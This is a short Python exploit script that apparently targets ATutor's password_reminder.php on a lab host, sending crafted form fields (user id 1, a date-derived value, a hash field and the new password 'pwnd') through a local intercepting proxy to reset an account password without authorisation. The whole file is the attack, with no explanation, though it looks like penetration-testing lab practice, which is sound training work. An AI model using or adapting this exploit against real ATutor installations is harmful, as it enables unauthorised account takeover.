import requests
import time
import hashlib
m = hashlib.sha1()
#m.update('winsam')
#print m.hexdigest()
proxies = {
'http': 'http://127.0.0.1:8080',
}
data={'form_change':'true', 'id':'1', 'g':int(time.time()/60/60/24)+1, 'h':",",'form_password_hidden':'pwnd', 'submit':'Submit'}
requests.post('http://192.168.11.137/ATutor/password_reminder.php', data=data, allow_redirects=False,proxies=proxies)
